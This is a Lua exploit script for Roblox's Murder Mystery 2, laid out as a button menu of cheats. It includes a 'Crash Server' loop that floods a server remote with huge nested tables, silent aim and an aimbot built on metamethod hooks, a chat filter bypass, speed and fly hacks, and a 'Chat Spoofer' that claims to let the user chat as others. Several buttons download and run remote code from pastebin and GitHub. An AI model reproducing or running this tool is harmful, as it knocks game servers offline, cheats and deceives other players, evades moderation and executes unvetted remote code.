local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("MM2 Hub", "BloodTheme")


local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("ESP", "Spy Mode", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/wMwN5Ygu", true))()
end)

MainSection:NewButton("Chat Bypass", "", function()
    local ScreenGui = Instance.new("ScreenGui")
    local Frame = Instance.new("Frame")
    local TextBox = Instance.new("TextBox")
    local TextButton = Instance.new("TextButton")
    local msgSendInfo = Instance.new("TextLabel")
    local TextLabel = Instance.new("TextLabel")
    local TextLabel_2 = Instance.new("TextLabel")
    
    ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    Frame.Parent = ScreenGui
    Frame.BackgroundColor3 = Color3.fromRGB(85, 85, 127)
    Frame.Position = UDim2.new(0.332552671, 0, 0.629629672, 0)
    Frame.Size = UDim2.new(0, 429, 0, 264)
    
    
    TextBox.Parent = Frame
    TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextBox.BackgroundTransparency = 0.750
    TextBox.Position = UDim2.new(0.048181355, 0, 0.211781323, 0)
    TextBox.Size = UDim2.new(0, 387, 0, 50)
    TextBox.Font = Enum.Font.SourceSans
    TextBox.PlaceholderText = "ligma"
    TextBox.Text = ""
    TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextBox.TextSize = 14.000
    
    TextButton.Parent = Frame
    TextButton.BackgroundColor3 = Color3.fromRGB(100, 100, 127)
    TextButton.Position = UDim2.new(0.266105473, 0, 0.460054487, 0)
    TextButton.Size = UDim2.new(0, 200, 0, 50)
    TextButton.Font = Enum.Font.SourceSans
    TextButton.Text = "Send"
    TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextButton.TextSize = 14.000
    
    msgSendInfo.Name = "msgSendInfo"
    msgSendInfo.Parent = Frame
    msgSendInfo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    msgSendInfo.BackgroundTransparency = 1.000
    msgSendInfo.Position = UDim2.new(0.417014688, 0, 0.0376014113, 0)
    msgSendInfo.Size = UDim2.new(0, 106, 0, 30)
    msgSendInfo.Font = Enum.Font.SourceSans
    msgSendInfo.Text = "Msg To Send:"
    msgSendInfo.TextColor3 = Color3.fromRGB(255, 255, 255)
    msgSendInfo.TextSize = 14.000
    
    TextLabel.Parent = Frame
    TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel.BackgroundTransparency = 1.000
    TextLabel.Position = UDim2.new(0.250978559, 0, 0.648204207, 0)
    TextLabel.Size = UDim2.new(0, 213, 0, 50)
    TextLabel.Font = Enum.Font.SourceSans
    TextLabel.Text = "______________________________________________________________________"
    TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel.TextSize = 14.000
    
    TextLabel_2.Parent = ScreenGui
    TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_2.BackgroundTransparency = 1.000
    TextLabel_2.Position = UDim2.new(0.341139734, 0, 0.89259249, 0)
    TextLabel_2.Size = UDim2.new(0, 418, 0, 36)
    TextLabel_2.Font = Enum.Font.SourceSans
    TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_2.TextSize = 14.000
    
    
    local function LWDWP_fake_script() -- TextButton.LocalScript 
        local script = Instance.new('LocalScript', TextButton)
    
        script.Parent.MouseButton1Click:Connect(function()
            local message = script.Parent.Parent.TextBox.Text
            math.randomseed(tick())
            local ChatMain = require(game:GetService("Players").LocalPlayer.PlayerScripts.ChatScript.ChatMain)
            local function bypass()
                ChatMain.MessagePosted:fire("hi"..math.random(100000,1000000))
                ChatMain.MessagesChanged:fire(math.random(100000,1000000))
            end
            for v in message:gmatch"." do
                wait(0.4)
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v, "All")
                wait(0.4)
                bypass()
            end
        end)
    end
    coroutine.wrap(LWDWP_fake_script)()
end)

MainSection:NewButton("Crash Server", "Crash Server", function()
    --// made my reestart
--// fixed by daddy ewo
while wait(0.6) do --// don't change it's the best
    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
    local function getmaxvalue(val)
    local mainvalueifonetable = 499999
    if type(val) ~= "number" then
    return nil
    end
    local calculateperfectval = (mainvalueifonetable/(val+2))
    return calculateperfectval
    end
    local function bomb(tableincrease, tries)
    local maintable = {}
    local spammedtable = {}
    table.insert(spammedtable, {})
    z = spammedtable[1]
    for i = 1, tableincrease do
    local tableins = {}
    table.insert(z, tableins)
    z = tableins
    end
    local calculatemax = getmaxvalue(tableincrease)
    local maximum
    if calculatemax then
    maximum = calculatemax
    else
    maximum = 999999
    end
    for i = 1, maximum do
    table.insert(maintable, spammedtable)
    end
    for i = 1, tries do
    game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
    end
    end
    bomb(250, 2) --// change values if client crashes
    end
end)

MainSection:NewButton("Silent Aim", "Silent", function()
    -- loader
if not game:IsLoaded() then 
    game.Loaded:Wait()
end
 
if not syn or not protectgui then
    getgenv().protectgui = function() end
end
 
local SilentAimSettings = {
    Enabled = true,
 
    ClassName = "Universal Silent Aim - Project Redacted",
    ToggleKey = "RightAlt",
 
    TeamCheck = true,
    VisibleCheck = false, 
    TargetPart = "HumanoidRootPart",
    SilentAimMethod = "Raycast",
 
    FOVRadius = 200,
    FOVVisible = false,
    ShowSilentAimTarget = false, 
 
    MouseHitPrediction = false,
    MouseHitPredictionAmount = 0.165,
    HitChance = 100
}
 
-- variables
getgenv().SilentAimSettings = Settings
local MainFileName = "UniversalSilentAim"
local SelectedFile, FileToSave = "", ""
 
local Camera = workspace.CurrentCamera
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local GuiService = game:GetService("GuiService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
 
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
 
local GetChildren = game.GetChildren
local GetPlayers = Players.GetPlayers
local WorldToScreen = Camera.WorldToScreenPoint
local WorldToViewportPoint = Camera.WorldToViewportPoint
local GetPartsObscuringTarget = Camera.GetPartsObscuringTarget
local FindFirstChild = game.FindFirstChild
local RenderStepped = RunService.RenderStepped
local GuiInset = GuiService.GetGuiInset
local GetMouseLocation = UserInputService.GetMouseLocation
 
local resume = coroutine.resume 
local create = coroutine.create
 
local ValidTargetParts = {"Head", "HumanoidRootPart"}
local PredictionAmount = 0.165
 
local mouse_box = Drawing.new("Square")
mouse_box.Visible = true 
mouse_box.ZIndex = 999 
mouse_box.Color = Color3.fromRGB(54, 57, 241)
mouse_box.Thickness = 20 
mouse_box.Size = Vector2.new(20, 20)
mouse_box.Filled = true 
 
local fov_circle = Drawing.new("Circle")
fov_circle.Thickness = 1
fov_circle.NumSides = 100
fov_circle.Radius = 180
fov_circle.Filled = false
fov_circle.Visible = false
fov_circle.ZIndex = 999
fov_circle.Transparency = 1
fov_circle.Color = Color3.fromRGB(54, 57, 241)
 
local ExpectedArguments = {
    FindPartOnRayWithIgnoreList = {
        ArgCountRequired = 3,
        Args = {
            "Instance", "Ray", "table", "boolean", "boolean"
        }
    },
    FindPartOnRayWithWhitelist = {
        ArgCountRequired = 3,
        Args = {
            "Instance", "Ray", "table", "boolean"
        }
    },
    FindPartOnRay = {
        ArgCountRequired = 2,
        Args = {
            "Instance", "Ray", "Instance", "boolean", "boolean"
        }
    },
    Raycast = {
        ArgCountRequired = 3,
        Args = {
            "Instance", "Vector3", "Vector3", "RaycastParams"
        }
    }
}
 
function CalculateChance(Percentage)
    -- // Floor the percentage
    Percentage = math.floor(Percentage)
 
    -- // Get the chance
    local chance = math.floor(Random.new().NextNumber(Random.new(), 0, 1) * 100) / 100
 
    -- // Return
    return chance <= Percentage / 100
end
 
 
--[[file handling]] do 
    if not isfolder(MainFileName) then 
        makefolder(MainFileName);
    end
 
    if not isfolder(string.format("%s/%s", MainFileName, tostring(game.PlaceId))) then 
        makefolder(string.format("%s/%s", MainFileName, tostring(game.PlaceId)))
    end
end
 
local Files = listfiles(string.format("%s/%s", "UniversalSilentAim", tostring(game.PlaceId)))
 
-- functions
local function GetFiles() -- credits to the linoria lib for this function, listfiles returns the files full path and its annoying
	local out = {}
	for i = 1, #Files do
		local file = Files[i]
		if file:sub(-4) == '.lua' then
			-- i hate this but it has to be done ...
 
			local pos = file:find('.lua', 1, true)
			local start = pos
 
			local char = file:sub(pos, pos)
			while char ~= '/' and char ~= '\\' and char ~= '' do
				pos = pos - 1
				char = file:sub(pos, pos)
			end
 
			if char == '/' or char == '\\' then
				table.insert(out, file:sub(pos + 1, start - 1))
			end
		end
	end
 
	return out
end
 
local function UpdateFile(FileName)
    assert(FileName or FileName == "string", "oopsies");
    writefile(string.format("%s/%s/%s.lua", MainFileName, tostring(game.PlaceId), FileName), HttpService:JSONEncode(SilentAimSettings))
end
 
local function LoadFile(FileName)
    assert(FileName or FileName == "string", "oopsies");
 
    local File = string.format("%s/%s/%s.lua", MainFileName, tostring(game.PlaceId), FileName)
    local ConfigData = HttpService:JSONDecode(readfile(File))
    for Index, Value in next, ConfigData do
        SilentAimSettings[Index] = Value
    end
end
 
local function getPositionOnScreen(Vector)
    local Vec3, OnScreen = WorldToScreen(Camera, Vector)
    return Vector2.new(Vec3.X, Vec3.Y), OnScreen
end
 
local function ValidateArguments(Args, RayMethod)
    local Matches = 0
    if #Args < RayMethod.ArgCountRequired then
        return false
    end
    for Pos, Argument in next, Args do
        if typeof(Argument) == RayMethod.Args[Pos] then
            Matches = Matches + 1
        end
    end
    return Matches >= RayMethod.ArgCountRequired
end
 
local function getDirection(Origin, Position)
    return (Position - Origin).Unit * 1000
end
 
local function getMousePosition()
    return GetMouseLocation(UserInputService)
end
 
local function IsPlayerVisible(Player)
    local PlayerCharacter = Player.Character
    local LocalPlayerCharacter = LocalPlayer.Character
 
    if not (PlayerCharacter or LocalPlayerCharacter) then return end 
 
    local PlayerRoot = FindFirstChild(PlayerCharacter, Options.TargetPart.Value) or FindFirstChild(PlayerCharacter, "HumanoidRootPart")
 
    if not PlayerRoot then return end 
 
    local CastPoints, IgnoreList = {PlayerRoot.Position, LocalPlayerCharacter, PlayerCharacter}, {LocalPlayerCharacter, PlayerCharacter}
    local ObscuringObjects = #GetPartsObscuringTarget(Camera, CastPoints, IgnoreList)
 
    return ((ObscuringObjects == 0 and true) or (ObscuringObjects > 0 and false))
end
 
local function getClosestPlayer()
    if not Options.TargetPart.Value then return end
    local Closest
    local DistanceToMouse
    for _, Player in next, GetPlayers(Players) do
        if Player == LocalPlayer then continue end
        if Toggles.TeamCheck.Value and Player.Team == LocalPlayer.Team then continue end
 
        local Character = Player.Character
        if not Character then continue end
 
        if Toggles.VisibleCheck.Value and not IsPlayerVisible(Player) then continue end
 
        local HumanoidRootPart = FindFirstChild(Character, "HumanoidRootPart")
        local Humanoid = FindFirstChild(Character, "Humanoid")
        if not HumanoidRootPart or not Humanoid or Humanoid and Humanoid.Health <= 0 then continue end
 
        local ScreenPosition, OnScreen = getPositionOnScreen(HumanoidRootPart.Position)
        if not OnScreen then continue end
 
        local Distance = (getMousePosition() - ScreenPosition).Magnitude
        if Distance <= (DistanceToMouse or Options.Radius.Value or 2000) then
            Closest = ((Options.TargetPart.Value == "Random" and Character[ValidTargetParts[math.random(1, #ValidTargetParts)]]) or Character[Options.TargetPart.Value])
            DistanceToMouse = Distance
        end
    end
    return Closest
end
 
-- ui creating & handling
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xaxaxaxaxaxaxaxaxa/Libraries/main/UI's/Linoria/Source.lua"))()
 
local Window = Library:CreateWindow("Universal Silent Aim, by Project Redacted")
local GeneralTab = Window:AddTab("General")
local MainBOX = GeneralTab:AddLeftTabbox("Main") do
    local Main = MainBOX:AddTab("Main")
 
    Main:AddToggle("aim_Enabled", {Text = "Enabled"}):AddKeyPicker("aim_Enabled_KeyPicker", {Default = "RightAlt", SyncToggleState = true, Mode = "Toggle", Text = "Enabled", NoUI = false});
    Options.aim_Enabled_KeyPicker:OnClick(function()
        SilentAimSettings.Enabled = not SilentAimSettings.Enabled
 
        Toggles.aim_Enabled.Value = SilentAimSettings.Enabled
        Toggles.aim_Enabled:SetValue(SilentAimSettings.Enabled)
 
        mouse_box.Visible = SilentAimSettings.Enabled
    end)
 
    Main:AddToggle("TeamCheck", {Text = "Team Check", Default = SilentAimSettings.TeamCheck}):OnChanged(function()
        SilentAimSettings.TeamCheck = Toggles.TeamCheck.Value
    end)
    Main:AddToggle("VisibleCheck", {Text = "Visible Check", Default = SilentAimSettings.VisibleCheck}):OnChanged(function()
        SilentAimSettings.VisibleCheck = Toggles.VisibleCheck.Value
    end)
    Main:AddDropdown("TargetPart", {Text = "Target Part", Default = SilentAimSettings.TargetPart, Values = {"Head", "HumanoidRootPart", "Random"}}):OnChanged(function()
        SilentAimSettings.TargetPart = Options.TargetPart.Value
    end)
    Main:AddDropdown("Method", {Text = "Silent Aim Method", Default = SilentAimSettings.SilentAimMethod, Values = {
        "Raycast","FindPartOnRay",
        "FindPartOnRayWithWhitelist",
        "FindPartOnRayWithIgnoreList",
        "Mouse.Hit/Target"
    }}):OnChanged(function() 
        SilentAimSettings.SilentAimMethod = Options.Method.Value 
    end)
    Main:AddSlider('HitChance', {
        Text = 'Hit chance',
        Default = 100,
        Min = 0,
        Max = 100,
        Rounding = 1,
 
        Compact = false,
    })
    Options.HitChance:OnChanged(function()
        SilentAimSettings.HitChance = Options.HitChance.Value
    end)
end
 
local MiscellaneousBOX = GeneralTab:AddLeftTabbox("Miscellaneous")
local FieldOfViewBOX = GeneralTab:AddLeftTabbox("Field Of View") do
    local Main = FieldOfViewBOX:AddTab("Visuals")
 
    Main:AddToggle("Visible", {Text = "Show FOV Circle"}):AddColorPicker("Color", {Default = Color3.fromRGB(54, 57, 241)}):OnChanged(function()
        fov_circle.Visible = Toggles.Visible.Value
        SilentAimSettings.FOVVisible = Toggles.Visible.Value
    end)
    Main:AddSlider("Radius", {Text = "FOV Circle Radius", Min = 0, Max = 360, Default = 130, Rounding = 0}):OnChanged(function()
        fov_circle.Radius = Options.Radius.Value
        SilentAimSettings.FOVRadius = Options.Radius.Value
    end)
    Main:AddToggle("MousePosition", {Text = "Show Silent Aim Target"}):AddColorPicker("MouseVisualizeColor", {Default = Color3.fromRGB(54, 57, 241)}):OnChanged(function()
        mouse_box.Visible = Toggles.MousePosition.Value 
        SilentAimSettings.ShowSilentAimTarget = Toggles.MousePosition.Value 
    end)
    local PredictionTab = MiscellaneousBOX:AddTab("Prediction")
    PredictionTab:AddToggle("Prediction", {Text = "Mouse.Hit/Target Prediction"}):OnChanged(function()
        SilentAimSettings.MouseHitPrediction = Toggles.Prediction.Value
    end)
    PredictionTab:AddSlider("Amount", {Text = "Prediction Amount", Min = 0.165, Max = 1, Default = 0.165, Rounding = 3}):OnChanged(function()
        PredictionAmount = Options.Amount.Value
        SilentAimSettings.MouseHitPredictionAmount = Options.Amount.Value
    end)
end
 
local CreateConfigurationBOX = GeneralTab:AddRightTabbox("Create Configuration") do 
    local Main = CreateConfigurationBOX:AddTab("Create Configuration")
 
    Main:AddInput("CreateConfigTextBox", {Default = "", Numeric = false, Finished = false, Text = "Create Configuration to Create", Tooltip = "Creates a configuration file containing settings you can save and load", Placeholder = "File Name here"}):OnChanged(function()
        if Options.CreateConfigTextBox.Value and string.len(Options.CreateConfigTextBox.Value) ~= "" then 
            FileToSave = Options.CreateConfigTextBox.Value
        end
    end)
 
    Main:AddButton("Create Configuration File", function()
        if FileToSave ~= "" or FileToSave ~= nil then 
            UpdateFile(FileToSave)
        end
    end)
end
 
local SaveConfigurationBOX = GeneralTab:AddRightTabbox("Save Configuration") do 
    local Main = SaveConfigurationBOX:AddTab("Save Configuration")
    Main:AddDropdown("SaveConfigurationDropdown", {Values = GetFiles(), Text = "Choose Configuration to Save"})
    Main:AddButton("Save Configuration", function()
        if Options.SaveConfigurationDropdown.Value then 
            UpdateFile(Options.SaveConfigurationDropdown.Value)
        end
    end)
end
 
local LoadConfigurationBOX = GeneralTab:AddRightTabbox("Load Configuration") do 
    local Main = LoadConfigurationBOX:AddTab("Load Configuration")
 
    Main:AddDropdown("LoadConfigurationDropdown", {Values = GetFiles(), Text = "Choose Configuration to Load"})
    Main:AddButton("Load Configuration", function()
        if table.find(GetFiles(), Options.LoadConfigurationDropdown.Value) then
            LoadFile(Options.LoadConfigurationDropdown.Value)
 
            Toggles.TeamCheck:SetValue(SilentAimSettings.TeamCheck)
            Toggles.VisibleCheck:SetValue(SilentAimSettings.VisibleCheck)
            Options.TargetPart:SetValue(SilentAimSettings.TargetPart)
            Options.Method:SetValue(SilentAimSettings.SilentAimMethod)
            Toggles.Visible:SetValue(SilentAimSettings.FOVVisible)
            Options.Radius:SetValue(SilentAimSettings.FOVRadius)
            Toggles.MousePosition:SetValue(SilentAimSettings.ShowSilentAimTarget)
            Toggles.Prediction:SetValue(SilentAimSettings.MouseHitPrediction)
            Options.Amount:SetValue(SilentAimSettings.MouseHitPredictionAmount)
            Options.HitChance:SetValue(SilentAimSettings.HitChance)
        end
    end)
end
 
resume(create(function()
    RenderStepped:Connect(function()
        if Toggles.MousePosition.Value and Toggles.aim_Enabled.Value then
            if getClosestPlayer() then 
                local Root = getClosestPlayer().Parent.PrimaryPart or getClosestPlayer()
                local RootToViewportPoint, IsOnScreen = WorldToViewportPoint(Camera, Root.Position);
                -- using PrimaryPart instead because if your Target Part is "Random" it will flicker the square between the Target's Head and HumanoidRootPart (its annoying)
 
                mouse_box.Visible = IsOnScreen
                mouse_box.Position = Vector2.new(RootToViewportPoint.X, RootToViewportPoint.Y)
            else 
                mouse_box.Visible = false 
                mouse_box.Position = Vector2.new()
            end
        end
 
        if Toggles.Visible.Value then 
            fov_circle.Visible = Toggles.Visible.Value
            fov_circle.Color = Options.Color.Value
            fov_circle.Position = getMousePosition()
        end
    end)
end))
 
-- hooks
local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(...)
    local Method = getnamecallmethod()
    local Arguments = {...}
    local self = Arguments[1]
    local chance = CalculateChance(SilentAimSettings.HitChance)
    if Toggles.aim_Enabled.Value and self == workspace and not checkcaller() and chance == true then
        if Method == "FindPartOnRayWithIgnoreList" and Options.Method.Value == Method then
            if ValidateArguments(Arguments, ExpectedArguments.FindPartOnRayWithIgnoreList) then
                local A_Ray = Arguments[2]
 
                local HitPart = getClosestPlayer()
                if HitPart then
                    local Origin = A_Ray.Origin
                    local Direction = getDirection(Origin, HitPart.Position)
                    Arguments[2] = Ray.new(Origin, Direction)
 
                    return oldNamecall(unpack(Arguments))
                end
            end
        elseif Method == "FindPartOnRayWithWhitelist" and Options.Method.Value == Method then
            if ValidateArguments(Arguments, ExpectedArguments.FindPartOnRayWithWhitelist) then
                local A_Ray = Arguments[2]
 
                local HitPart = getClosestPlayer()
                if HitPart then
                    local Origin = A_Ray.Origin
                    local Direction = getDirection(Origin, HitPart.Position)
                    Arguments[2] = Ray.new(Origin, Direction)
 
                    return oldNamecall(unpack(Arguments))
                end
            end
        elseif (Method == "FindPartOnRay" or Method == "findPartOnRay") and Options.Method.Value:lower() == Method:lower() then
            if ValidateArguments(Arguments, ExpectedArguments.FindPartOnRay) then
                local A_Ray = Arguments[2]
 
                local HitPart = getClosestPlayer()
                if HitPart then
                    local Origin = A_Ray.Origin
                    local Direction = getDirection(Origin, HitPart.Position)
                    Arguments[2] = Ray.new(Origin, Direction)
 
                    return oldNamecall(unpack(Arguments))
                end
            end
        elseif Method == "Raycast" and Options.Method.Value == Method then
            if ValidateArguments(Arguments, ExpectedArguments.Raycast) then
                local A_Origin = Arguments[2]
 
                local HitPart = getClosestPlayer()
                if HitPart then
                    Arguments[3] = getDirection(A_Origin, HitPart.Position)
 
                    return oldNamecall(unpack(Arguments))
                end
            end
        end
    end
    return oldNamecall(...)
end))
 
local oldIndex = nil 
oldIndex = hookmetamethod(game, "__index", newcclosure(function(self, Index)
    if self == Mouse and not checkcaller() and Toggles.aim_Enabled.Value and Options.Method.Value == "Mouse.Hit/Target" and getClosestPlayer() then
        local HitPart = getClosestPlayer()
 
        if Index == "Target" or Index == "target" then 
            return HitPart
        elseif Index == "Hit" or Index == "hit" then 
            return ((Toggles.Prediction.Value and (HitPart.CFrame + (HitPart.Velocity * PredictionAmount))) or (not Toggles.Prediction.Value and HitPart.CFrame))
        elseif Index == "X" or Index == "x" then 
            return self.X 
        elseif Index == "Y" or Index == "y" then 
            return self.Y 
        elseif Index == "UnitRay" then 
            return Ray.new(self.Origin, (self.Hit - self.Origin).Unit)
        end
    end
 
    return oldIndex(self, Index)
end))
end)


MainSection:NewButton("Inf Jump", "Weeee", function()
    local Player = game:GetService'Players'.LocalPlayer;
local UIS = game:GetService'UserInputService';
 
_G.JumpHeight = 50;
 
function Action(Object, Function) if Object ~= nil then Function(Object); end end
 
UIS.InputBegan:connect(function(UserInput)
    if UserInput.UserInputType == Enum.UserInputType.Keyboard and UserInput.KeyCode == Enum.KeyCode.Space then
        Action(Player.Character.Humanoid, function(self)
            if self:GetState() == Enum.HumanoidStateType.Jumping or self:GetState() == Enum.HumanoidStateType.Freefall then
                Action(self.Parent.HumanoidRootPart, function(self)
                    self.Velocity = Vector3.new(0, _G.JumpHeight, 0);
                end)
            end
        end)
    end
end)
end)

MainSection:NewButton("AimBot", "Pewww", function()
    local Camera = workspace.CurrentCamera
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer
local Holding = false

_G.AimbotEnabled = true
_G.TeamCheck = false -- If set to true then the script would only lock your aim at enemy team members.
_G.AimPart = "Head" -- Where the aimbot script would lock at.
_G.Sensitivity = 0 -- How many seconds it takes for the aimbot script to officially lock onto the target's aimpart.

_G.CircleSides = 64 -- How many sides the FOV circle would have.
_G.CircleColor = Color3.fromRGB(255, 255, 255) -- (RGB) Color that the FOV circle would appear as.
_G.CircleTransparency = 0.7 -- Transparency of the circle.
_G.CircleRadius = 80 -- The radius of the circle / FOV.
_G.CircleFilled = false -- Determines whether or not the circle is filled.
_G.CircleVisible = true -- Determines whether or not the circle is visible.
_G.CircleThickness = 0 -- The thickness of the circle.

local FOVCircle = Drawing.new("Circle")
FOVCircle.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
FOVCircle.Radius = _G.CircleRadius
FOVCircle.Filled = _G.CircleFilled
FOVCircle.Color = _G.CircleColor
FOVCircle.Visible = _G.CircleVisible
FOVCircle.Radius = _G.CircleRadius
FOVCircle.Transparency = _G.CircleTransparency
FOVCircle.NumSides = _G.CircleSides
FOVCircle.Thickness = _G.CircleThickness

local function GetClosestPlayer()
	local MaximumDistance = _G.CircleRadius
	local Target = nil

	for _, v in next, Players:GetPlayers() do
		if v.Name ~= LocalPlayer.Name then
			if _G.TeamCheck == true then
				if v.Team ~= LocalPlayer.Team then
					if v.Character ~= nil then
						if v.Character:FindFirstChild("HumanoidRootPart") ~= nil then
							if v.Character:FindFirstChild("Humanoid") ~= nil and v.Character:FindFirstChild("Humanoid").Health ~= 0 then
								local ScreenPoint = Camera:WorldToScreenPoint(v.Character:WaitForChild("HumanoidRootPart", math.huge).Position)
								local VectorDistance = (Vector2.new(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y) - Vector2.new(ScreenPoint.X, ScreenPoint.Y)).Magnitude
								
								if VectorDistance < MaximumDistance then
									Target = v
								end
							end
						end
					end
				end
			else
				if v.Character ~= nil then
					if v.Character:FindFirstChild("HumanoidRootPart") ~= nil then
						if v.Character:FindFirstChild("Humanoid") ~= nil and v.Character:FindFirstChild("Humanoid").Health ~= 0 then
							local ScreenPoint = Camera:WorldToScreenPoint(v.Character:WaitForChild("HumanoidRootPart", math.huge).Position)
							local VectorDistance = (Vector2.new(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y) - Vector2.new(ScreenPoint.X, ScreenPoint.Y)).Magnitude
							
							if VectorDistance < MaximumDistance then
								Target = v
							end
						end
					end
				end
			end
		end
	end

	return Target
end

UserInputService.InputBegan:Connect(function(Input)
    if Input.UserInputType == Enum.UserInputType.MouseButton2 then
        Holding = true
    end
end)

UserInputService.InputEnded:Connect(function(Input)
    if Input.UserInputType == Enum.UserInputType.MouseButton2 then
        Holding = false
    end
end)

RunService.RenderStepped:Connect(function()
    FOVCircle.Position = Vector2.new(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y)
    FOVCircle.Radius = _G.CircleRadius
    FOVCircle.Filled = _G.CircleFilled
    FOVCircle.Color = _G.CircleColor
    FOVCircle.Visible = _G.CircleVisible
    FOVCircle.Radius = _G.CircleRadius
    FOVCircle.Transparency = _G.CircleTransparency
    FOVCircle.NumSides = _G.CircleSides
    FOVCircle.Thickness = _G.CircleThickness

    if Holding == true and _G.AimbotEnabled == true then
        TweenService:Create(Camera, TweenInfo.new(_G.Sensitivity, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {CFrame = CFrame.new(Camera.CFrame.Position, GetClosestPlayer().Character[_G.AimPart].Position)}):Play()
    end
end)
end)
    


local Misc = Window:NewTab("Misc")
local MiscSection = Misc:NewSection("Misc")

MiscSection:NewSlider("Walkspeed", "SPEED!!", 500, 16, function(s)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
end)

MiscSection:NewSlider("Jumppower", "JUMP HIGH!!", 350, 50, function(s)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
end)

MiscSection:NewButton("Reset WS/JP", "Resets to all defaults", function()
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
end)


local Other = Window:NewTab("Other")
local OtherSection = Other:NewSection("Other")
OtherSection:NewButton("Chat Spoofer", "Lets you chat for other people", function()
    loadstring(game:HttpGet(('https://pastebin.com/raw/djBfk8Li'),true))()
end)

OtherSection:NewButton("Bypassed Fly", "bird mode", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Nicuse/RobloxScripts/main/BypassedFly.lua"))() 

    Fly(true)
end)
